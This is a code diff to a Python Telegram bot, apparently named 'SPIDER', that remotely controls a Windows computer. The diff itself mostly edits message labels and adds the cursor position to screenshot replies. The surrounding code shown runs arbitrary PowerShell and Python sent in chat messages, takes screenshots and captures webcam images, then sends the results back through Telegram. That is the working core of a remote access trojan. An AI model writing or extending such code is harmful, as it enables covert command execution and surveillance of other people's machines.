@@ -22,7 +22,7 @@ if check_internet_connection():
             return False
 @bot.message_handler(func=lambda m: True,content_types=["text"])
 def echo_all(message):
-    global end,file_otpr,file_otpr_dir,search_sys
+    global end,file_otpr,file_otpr_dir,search_sys,version
     try:
         end = ""
         basic_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
@@ -136,10 +136,10 @@ def echo_all(message):
             elif "num" == b:
                 bot.send_message(message.chat.id, "NUMBERS MODE", reply_markup=num_keyboard)
             elif "cmd " in b:
-                bot.send_message(message.chat.id, "|SPIDER| - PYTHON COMMAND\n``` " + b.split("cmd")[1][1:] + " ```",parse_mode="Markdown")
+                bot.send_message(message.chat.id, "|SPIDER| - Windows PowerShell COMMAND:\n``` " + b.split("cmd",1)[1][1:] + " ```",parse_mode="Markdown")
                 end = os.popen("powershell.exe "+b.split("cmd")[1][1:]).read()
             elif "pye " in b:
-                bot.send_message(message.chat.id, "|SPIDER| - PYTHON COMMAND\n``` " + b.split("py")[1][1:] + " ```",parse_mode="Markdown")
+                bot.send_message(message.chat.id, "|SPIDER| - Python COMMAND\n``` " + b.split("py")[1][1:] + " ```",parse_mode="Markdown")
                 exec(b.split("py")[1][1:])
             elif "powershell"==b:
               bot.send_message(message.chat.id,'powershell.exe Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0,0)')
@@ -313,7 +313,7 @@ def echo_all(message):
                 img_byte_arr = io.BytesIO()
                 screenshot.save(img_byte_arr, format='PNG')
                 img_byte_arr.seek(0)
-                end = "YOUR SCREENSHOT WITH CURSOR↑"
+                end = f"YOUR SCREENSHOT WITH CURSOR↑\nPOS: {mouse.get_position()}"
                 bot.send_photo(message.chat.id, img_byte_arr)
             elif "photo"==b:
                 cap = cv2.VideoCapture(0)
